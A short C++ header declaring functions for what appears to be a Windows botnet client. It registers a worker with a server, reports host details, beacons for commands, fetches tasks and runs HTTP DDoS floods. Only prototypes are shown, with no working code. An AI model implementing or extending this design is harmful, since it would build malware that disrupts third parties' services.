#ifndef win_functions_h
#define win_functions_h

#include <string>
#include "worker.h"
#include "task.h"
#include <WinSock2.h>

Worker registerWorkerWin(const char* serverIP, int serverPort, in_addr ipAddress, std::string cpu, std::string ramInfo);
in_addr getIpAddress();
std::string getCPUInfo();
std::string getRAMInfo();
Command beacon(const char* serverIP, int serverPort, Worker worker);
Task request(const char* serverIP, int serverPort, Worker worker);
std::string makeHttpRequest(const char* serverIP, int serverPort, std::string httpRequest);
std::string extractJSON(std::string json);
bool doTask(const char* serverIP, int serverPort, Task task);
bool doDDOS(Task task);
void makeHttpDDOSRequest(std::string address, bool log);

#endif
